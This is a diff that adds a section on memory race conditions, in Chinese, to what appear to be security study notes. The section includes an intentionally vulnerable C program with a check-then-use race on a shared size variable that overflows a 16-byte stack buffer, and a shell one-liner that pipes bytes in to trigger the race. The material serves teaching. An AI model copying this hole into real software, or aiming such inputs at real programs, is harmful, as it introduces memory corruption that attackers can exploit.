@@ -249,7 +249,48 @@ int main(){
 
 # 4. Races in memory<br>
 内存是线程间共享的资源，内存条件竞争在多线程程序中十分泛滥。<br>
+可以看一下实际代码:<br>
+```c
+#include <stdio.h>
+#include <pthread.h>
+#include <stdlib.h>
+#include <unistd.h>
+unsigned int size = 42;
 
+void read_data(){
+    char buffer[16];
+    if(size<16){
+        printf("Valid size! Enter payload up to %d bytes\n",size);
+        printf("Read %d bytes!\n",read(0,buffer,size));
+    }else{
+        printf("Invalid size!\n",size);
+    }
+}
+void *thread_allocator(int arg){
+    while(1) read_data();
+}
+
+int main(){
+    pthread_t allocator;
+    pthread_create(&allocator,NULL,thread_allocator,0);
+    while(size!=0) read(0,&size,1);
+    exit(0);
+}
+```
+这个代码的问题在于在线程当中，`size的check和size的实际使用之间是存在时间差的`<br>
+利用方法：<br>
+```shell
+while true;do echo -ne "\x01\xff";done | ./pthread3
+# -n表示不输出换行符，-e表示启用转义序列解析，即能识别\x形式
+```
+利用的核心思路是让线程执行如下操作：<br>
+```
+1. read(0,&size,1); 读入\x01
+2. size<16校验通过
+3. read(0,&size,1) 读入\xff
+4. read(0,buffer,size)
+```
+![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2024-9-25/20241219220040.png)
 
 # 5. Signals and reentrancy<br>
 
